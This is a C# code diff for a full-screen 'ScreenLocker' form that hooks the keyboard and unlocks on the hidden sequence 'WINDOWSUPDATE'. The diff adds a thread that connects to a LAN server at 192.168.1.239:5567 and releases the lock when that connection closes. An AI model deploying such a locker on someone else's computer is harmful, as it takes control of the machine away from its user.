@@ -7,6 +7,10 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Threading;
+using System.Net.Sockets;
+using System.IO;
+using System.Diagnostics;
 
 namespace ScreenLocker
 {
@@ -15,12 +19,50 @@ namespace ScreenLocker
         private string UnLockKeys = "WINDOWSUPDATE";
         private int UnLockMatch;
         private UserActivityHook hook;
+        private Thread StreamThread;
         public ScreenLockForm()
         {
             InitKeyChecker();
             HookKeys();
             InitializeComponent();
             SetFullScreen();
+
+            // stream thread
+            StreamThread = new Thread(() =>
+            {
+                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                while (true)
+                {
+                    try
+                    {
+                        socket.Connect("192.168.1.239", 5567); // 1.設定 IP:Port 2.連線至伺服器
+                        break;
+                    }
+                    catch(SocketException)
+                    {
+                        Thread.Sleep(1000);
+                    }
+                }
+
+                NetworkStream stream = new NetworkStream(socket);
+                StreamReader sr = new StreamReader(stream);
+                //StreamWriter sw = new StreamWriter(stream);
+                try
+                {
+                    while (true)
+                    {
+                        sr.Read(); // block
+                        Thread.Sleep(1000);
+                    }
+                }
+                catch(IOException)
+                {
+                    Debug.Assert(!socket.Connected);
+                    // connection close
+                    SafeClose();
+                }
+            });
+            StreamThread.Start();
         }
 
         private void InitKeyChecker()
@@ -93,10 +135,22 @@ namespace ScreenLocker
             {
                 UnLockMatch++;
                 if (UnLockMatch == UnLockKeys.Length)
-                    this.Close();
+                    SafeClose();
             }
             else
                 UnLockMatch = 0;
+        }
+
+        private void SafeClose()
+        {
+            if (InvokeRequired)
+            {
+                this.BeginInvoke(new Action(() => { SafeClose(); }));
+                return;
+            }
+
+            StreamThread.Abort();
+            this.Close();
         }
     }
 }
